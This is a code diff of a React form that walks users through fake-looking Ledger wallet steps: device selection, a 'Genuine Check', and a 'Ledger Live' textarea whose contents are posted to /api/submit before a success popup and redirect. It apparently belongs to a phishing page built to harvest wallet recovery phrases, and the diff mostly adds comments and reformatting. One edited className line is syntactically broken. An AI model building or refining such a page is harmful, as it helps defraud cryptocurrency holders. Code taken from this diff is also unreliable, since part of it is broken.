@@ -21,12 +21,12 @@ const Form = () => {
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
   const [imageSelected, setImageSelected] = useState(false);
-  const [userInput, setUserInput] = useState("");
-  const [showPopup, setShowPopup] = useState(false);
   const [formData, setFormData] = useState("");
+  const [showPopup, setShowPopup] = useState(false);
 
   const steps = ["Device Detection", "Device Check", "Ledger Live"];
 
+  // Device selection
   const handleImageSelect = (image) => {
     setSelectedImage(image);
     setLoading(true);
@@ -38,25 +38,27 @@ const Form = () => {
     }, 2000);
   };
 
+  // Step 2 update
   const handleUpdateClick = () => {
     setLoading(false);
-
     setTimeout(() => {
       setCurrentStep(2);
       setLoading(false);
     });
   };
 
-  const handleFormDataChange = (event) => {
-    setFormData(event.target.value);
+  // Step 3 form data
+  const handleFormDataChange = (e) => {
+    setFormData(e.target.value);
   };
 
   const handleClosePopup = () => {
     setShowPopup(false);
   };
 
-  const handleStep3Submit = async (event) => {
-    event.preventDefault();
+  // Step 3 submit
+  const handleStep3Submit = async (e) => {
+    e.preventDefault();
 
     try {
       const response = await fetch("/api/submit", {
@@ -74,7 +76,7 @@ const Form = () => {
         setFormData("");
         setShowPopup(true);
 
-        // Redirect after 2 seconds so user sees popup
+        // redirect after 2s so user sees popup
         setTimeout(() => {
           navigate("/success");
         }, 2000);
@@ -88,11 +90,12 @@ const Form = () => {
 
   return (
     <>
+      {/* Timeline */}
       <div className={styles.timeline}>
         {steps.map((step, index) => (
           <div
-            className={'element ${currentStep === index ? "active" : ""}'}
             key={index}
+            className={element ${currentStep === index ? "active" : ""}}
           >
             <div
               className={`${styles.dotbox} ${
@@ -112,7 +115,9 @@ const Form = () => {
         ))}
       </div>
 
+      {/* Step content */}
       <div className={styles.step_content}>
+        {/* Step 1: Device selection */}
         {currentStep === 0 && (
           <div
             className={`${styles.step_one_content} ${
@@ -125,7 +130,10 @@ const Form = () => {
                 imageSelected ? styles.hidden : ""
               }`}
             >
-              {[{img: nanos, name:"Nano S"}, {img: nanoplus, name:"Nano S Plus"}, {img: nanox, name:"Nano X"}, {img: blue, name:"Blue"}].map((device) => (
+              {[{ img: nanos, name: "Nano S" },
+                { img: nanoplus, name: "Nano S Plus" },
+                { img: nanox, name: "Nano X" },
+                { img: blue, name: "Blue" }].map((device) => (
                 <div
                   key={device.name}
                   data-attribute={device.name}
@@ -144,6 +152,7 @@ const Form = () => {
           </div>
         )}
 
+        {/* Step 2: Genuine Check */}
         {currentStep === 1 && (
           <div
             className={`${styles.step_two_content} ${
@@ -175,6 +184,7 @@ const Form = () => {
           </div>
         )}
 
+        {/* Step 3: Ledger Live */}
         {currentStep === 2 && (
           <div className={styles.step_three_content}>
             <div style={{ height: "40px" }} />
@@ -187,7 +197,7 @@ const Form = () => {
                   placeholder=""
                   className={styles.textarea}
                   rows={2}
-                ></textarea>
+                />
               </div>
               <button type="submit" className={styles.submitButton}>
                 Continue
@@ -197,6 +207,7 @@ const Form = () => {
         )}
       </div>
 
+      {/* Loading */}
       {loading && (
         <div>
           <div className={styles.loader_content}>
@@ -207,6 +218,7 @@ const Form = () => {
         </div>
       )}
 
+      {/* Popup */}
       {showPopup && (
         <div className={styles.popup}>
           <PiSealCheckFill size={40} color="#bbb0fd" />
